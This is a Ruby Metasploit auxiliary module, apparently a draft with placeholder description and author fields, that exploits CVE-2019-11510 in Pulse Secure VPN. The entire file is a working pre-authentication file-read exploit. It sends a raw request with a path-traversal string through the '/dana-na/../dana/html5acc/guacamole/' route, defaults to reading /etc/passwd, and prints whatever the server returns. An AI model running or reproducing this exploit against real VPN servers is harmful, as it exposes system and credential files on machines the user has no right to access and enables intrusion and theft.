##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Pulse Secure VPN Pre-Auth File Read',
      'Description'    => %q{
        Something
      },
      'Author'         => [ '' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', ''],
          ['BID', ''],
          ['CVE', '2019-11510'],
          ['US-CERT-VU', ''],
          ['URL', ''],
        ],
      'DisclosureDate' => '08 May 2019',
      'Actions'        =>
        [
          ['Download']
        ],
      'DefaultAction'  => 'Download'
      ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('RPATH',
          [
            true,
            "The file to download",
            "/etc/passwd"
          ]
        ),
      ])
  end

  def run
    print_status("Retrieving contents of #{datastore['RPATH']}...")

    uri = "/dana-na/../dana/html5acc/guacamole/../../../../../.." + Rex::Text.uri_encode(datastore['RPATH']) + "?/dana/html5acc/guacamole/"

    res = send_request_raw({
      'uri'            => uri,
    }, 10)

    if res.include? "404"
      print_status("Path provided returned a 404.")
    else
      print_status("The server returned: #{res.code} #{res.message}")
      print(res.body)
    end
  end
end
